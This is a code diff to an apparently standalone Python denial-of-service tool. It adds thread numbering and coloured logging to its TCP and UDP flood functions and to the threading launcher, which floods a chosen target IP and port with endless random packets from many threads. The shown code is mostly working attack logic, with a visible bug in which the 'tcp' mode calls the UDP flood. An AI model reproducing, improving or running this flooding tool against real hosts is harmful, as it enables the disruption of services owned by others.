@@ -29,26 +29,28 @@ class Dos():
         size = os.urandom(min(65500, buffer_size))
         return size
 
-    def tcp_flood(self, ip, port, buffer_size):
+    def tcp_flood(self, ip, port, buffer_size, thread_nr):
         """ TCP flood function """
 
         while True:
             try:
                 data = self.size(buffer_size)
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                    print(CYAN + "Thread [{}] | Firing up [{}] to [{}]:[{}]".format(thread_nr, data, ip, port))
                     sock.connect((ip, port))
                     sock.send(data)
             except Exception:
                 print(RED + "Error in TCP" + RESET)
                 sys.exit(0)
 
-    def udp_flood(self, ip, port, buffer_size):
+    def udp_flood(self, ip, port, buffer_size, thread_nr):
         """ UDP flood function """
 
         while True:
             try:
                 data = self.size(buffer_size)
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                    print(CYAN + "Thread [{}] | Firing up [{}] to [{}]:[{}]".format(thread_nr, data, ip, port))
                     sock.sendto(data, (ip, port))
             except Exception:
                 print(RED + "Error in UDP" + RESET)
@@ -118,21 +120,21 @@ class Controller(Dos):
             print("Please define target in IP or [www.domain.com] format :", ex)
             sys.exit(0)
 
-    def threads(self, amount, dos_mode, target_ip, port, buffer_size):
+    def threads(self, amount, dos_mode, target_ip, port, buffer_size, thread_nr=None):
         """ Threading function to give arguments to dos class and start multiple threads """
 
         if dos_mode == 'tcp':
-            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
+            self.dos = lambda t, p, b, n: self.udp_flood(target_ip, port, buffer_size, thread_nr)
         elif dos_mode == 'udp':
-            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
-        for i in range(int(amount)+1):
-            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
-            print("[{}] Starting Thread to target [{}]".format(thread, target_ip))
+            self.dos = lambda t, p, b, n: self.udp_flood(target_ip, port, buffer_size, thread_nr)
+        for nr in range(int(amount)+1):
+            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size, nr))
+            print(GREEN + "[{}] Starting Thread to target [{}]".format(thread, target_ip) + RESET)
             try:
                 if thread.start():
-                    print("MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] to target [{}]".format(dos_mode, thread, buffer_size, target_ip))
+                    print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] to target [{}]".format(dos_mode, thread, buffer_size, target_ip) + RESET)
             except Exception:
-                print("Error in [{}]".format(thread))
+                print(RED + "Error in [{}]".format(thread) + RESET)
                 continue
 
     def run(self):
